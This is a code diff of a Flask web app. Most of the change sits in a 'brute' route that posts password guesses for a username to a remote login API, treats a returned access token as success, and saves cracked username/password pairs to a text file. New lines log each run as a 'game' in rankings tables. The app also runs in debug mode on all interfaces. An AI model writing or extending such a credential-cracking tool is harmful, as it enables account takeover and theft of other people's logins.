@@ -79,7 +79,7 @@ def login():
             return redirect(url_for('profile'))
         else:
             print("Invalid credentials")
-            return render_template('login.html', error='Invalid Credentials')
+            return render_template('login.html', error='Invalid Email Or Password')
     return render_template('login.html')
 
 @app.route('/profile')
@@ -168,19 +168,21 @@ def brute():
            reso = requests.post(api_url, data=req, headers=headers)
            resp = reso.json()
            resp = reso.json()
+           g.db.execute('INSERT INTO rankings (user_id, user) VALUES (?, ?)', [session['user_id'], url])
+           g.db.execute('UPDATE users SET games_played = games_played + 1 WHERE id = ?', [session['user_id']])
+           g.db.commit()
            if 'access_token' in resp:
               pa = ps
               info = user
               save = open("0.txt","a").write(f"•[{user}]=[{ps}]•")
               return render_template("brute.html", info=info, pa=ps)
-#           elif "error_msg" in resp:
- #               error = resp.get("error_msg")
-  #              return render_template("brute.html", error=error)
+
        if not found:
           error = "No matching password found."
           return render_template("brute.html", error=error)
 
     return render_template("brute.html")
+
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
